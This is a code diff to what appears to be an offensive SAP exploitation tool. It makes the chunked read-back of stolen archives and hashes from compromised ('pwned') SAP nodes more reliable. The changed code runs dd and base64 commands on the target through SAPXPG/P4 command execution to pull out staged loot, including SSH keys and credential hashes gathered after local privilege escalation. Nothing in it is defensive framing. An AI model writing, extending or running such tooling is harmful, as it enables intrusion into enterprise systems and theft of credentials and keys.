@@ -28,6 +28,20 @@ from sapmap_exploit import (
 
 logger = logging.getLogger(__name__)
 
+_B64_RE = re.compile(r"[A-Za-z0-9+/=]+")
+
+
+def _b64_only(raw_output: str) -> str:
+    """Extract only base64 characters from _run_cmd output.
+
+    SAPXPG P4 responses on kernel 793+ embed the base64 payload in
+    128-byte space-padded TLV blocks.  extract_p4_output may also
+    return non-base64 lines (command echo, dd record-count, duplicate
+    TLV artifacts).  Keeping only characters in the base64 alphabet
+    ensures the downstream b64decode sees a clean stream.
+    """
+    return "".join(_B64_RE.findall(raw_output))
+
 
 def harvest_scc_from_pwned_node(node: SAPNode, state: SAPMAPState) -> dict:
     """Harvest SCC presence, neighbour SCCs, and SSH keys from a pwned node.
@@ -387,10 +401,10 @@ def harvest_scc_from_pwned_node(node: SAPNode, state: SAPMAPState) -> dict:
                 chunks = []
                 offset = 0
                 while offset < sz:
-                    cb64 = _run_cmd(
+                    raw_out = _run_cmd(
                         f'dd if=/tmp/.scc_loot.tgz bs=1 skip={offset} '
-                        f'count={_CHUNK} 2>/dev/null | base64 | tr -d "\\n"'
-                    ).strip()
+                        f'count={_CHUNK} 2>/dev/null | base64 | tr -d "\\n"')
+                    cb64 = _b64_only(raw_out)
                     if not cb64:
                         break
                     chunks.append(cb64)
@@ -767,9 +781,10 @@ def harvest_scc_hashes_via_lpe(node: SAPNode, state: SAPMAPState) -> dict:
     # the PSE-loot chunked-read adapter.
     progress_every = max(1, n_chunks // 10)
     for chunk_idx in range(1, n_chunks + 1):
-        cb64 = _run_cmd(
+        raw_out = _run_cmd(
             f'dd if={staging} bs=1 skip={offset} count={_CHUNK_RAW} '
-            f'2>/dev/null | base64 | tr -d "\\n"').strip()
+            f'2>/dev/null | base64 | tr -d "\\n"')
+        cb64 = _b64_only(raw_out)
         if not cb64:
             print(f"  [chunked] chunk {chunk_idx}/{n_chunks} returned "
                   f"empty — aborting read-back")
